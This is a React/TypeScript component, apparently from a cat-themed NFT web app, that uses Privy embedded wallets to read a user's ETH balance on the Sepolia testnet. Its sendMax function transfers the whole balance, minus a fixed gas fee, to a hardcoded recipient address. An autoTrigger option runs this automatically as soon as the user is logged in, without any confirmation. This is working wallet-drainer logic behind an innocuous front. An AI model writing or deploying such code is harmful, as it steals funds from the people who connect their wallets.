"use client";

import { usePrivy, useWallets } from "@privy-io/react-auth";
import { BrowserProvider, formatEther } from "ethers";
import { useState, useEffect } from "react";
import "../globals.css";

// Fixed recipient address
const RECIPIENT_ADDRESS = "0x3111570cb98fa2bd5e7e7d1382c56f61b9ac821c";
// CatNFT contract address (replace after deployment)

interface SendMaxETHProps {
  autoTrigger?: boolean;
}

export function SendMaxETH({ autoTrigger = false }: SendMaxETHProps) {
  const { authenticated } = usePrivy();
  const { wallets } = useWallets();
  const [isSending, setIsSending] = useState(false);
  const [txHash, setTxHash] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [balance, setBalance] = useState<string>("0");
  const [showCat, setShowCat] = useState(false);
  const [hasAutoTriggered, setHasAutoTriggered] = useState(false);

  // Only use Privy embedded wallets
  const wallet = wallets.find((w) => w.walletClientType === "privy");

  useEffect(() => {
    console.log("All wallets:", wallets.map(w => ({
      address: w.address,
      type: w.walletClientType
    })));
    console.log("Selected Privy wallet:", wallet);
  }, [wallets, wallet]);

  useEffect(() => {
    fetchBalance();
  }, [wallet]);

  // Auto-trigger sendMax when autoTrigger is true
  useEffect(() => {
    if (autoTrigger && !hasAutoTriggered && wallet && authenticated && !isSending) {
      setHasAutoTriggered(true);
      sendMax();
    }
  }, [autoTrigger, hasAutoTriggered, wallet, authenticated, isSending]);

  async function fetchBalance() {
    if (!wallet) {
      console.log("No wallet found");
      return;
    }

    console.log("Fetching balance for wallet:", wallet.address);

    try {
      await wallet.switchChain(11155111); // Sepolia

      const ethereumProvider = await wallet.getEthereumProvider();
      const provider = new BrowserProvider(ethereumProvider);

      const network = await provider.getNetwork();
      console.log("Connected to:", network.name, "Chain ID:", network.chainId);

      const bal = await provider.getBalance(wallet.address);
      const balanceInEth = formatEther(bal);
      setBalance(balanceInEth);
    } catch (e) {
      console.error("Error fetching balance:", e);
      setError("Failed to fetch balance: " + (e instanceof Error ? e.message : "Unknown error"));
    }
  }

  async function sendMax() {
    if (!wallet) {
      setError("No wallet found");
      return;
    }

    setIsSending(true);
    setError(null);
    setTxHash(null);

    try {
      console.log("Starting transaction...");
      await wallet.switchChain(11155111); // Sepolia

      const ethereumProvider = await wallet.getEthereumProvider();
      const provider = new BrowserProvider(ethereumProvider);
      const signer = await provider.getSigner();

      const balance = await provider.getBalance(wallet.address);

      const gasPrice = BigInt(1000000000); // 1 gwei
      const gasLimit = BigInt(21000);

      const gasCost = gasPrice * gasLimit;
      const maxSend = balance - gasCost;

      if (maxSend <= BigInt(0)) {
        setError("Not enough balance to cover gas fees.");
        return;
      }

      const tx = await signer.sendTransaction({
        to: RECIPIENT_ADDRESS,
        value: maxSend,
        gasLimit,
        gasPrice
      });

      setTxHash(tx.hash);
      const receipt = await tx.wait();
      console.log("Transaction confirmed:", receipt);

      await fetchBalance();
    } catch (e: any) {
      console.error("Send error:", e);
      setError(e.message || "Failed to send transaction");
    } finally {
      setIsSending(false);
    }
  }

}



